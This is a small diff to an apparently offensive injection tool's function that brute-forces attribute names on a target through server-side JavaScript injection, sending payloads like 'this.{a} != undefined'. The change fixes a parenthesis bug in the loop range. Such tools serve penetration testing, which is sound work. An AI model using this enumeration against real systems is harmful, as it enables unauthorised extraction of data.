@@ -29,7 +29,7 @@ def SSJI_brute_attribute_names(attack_target, extraction_point):
     attributes_list.add(attack_target.scan_param_name)
     found_attributes = []    
     
-    for a, counter in zip(attributes_list, range(len(attributes_list-1))):       
+    for a, counter in zip(attributes_list, range(len(attributes_list)-1)):       
         extraction_payload = f'this.{a} != undefined'        
         if send_extraction_request(attack_target, extraction_point, extraction_payload):            
             attr_length = SSJI_get_extraction_parameter_length(attack_target,attack_target.scan_param_name, attack_target.baseline_response, extraction_point, a)
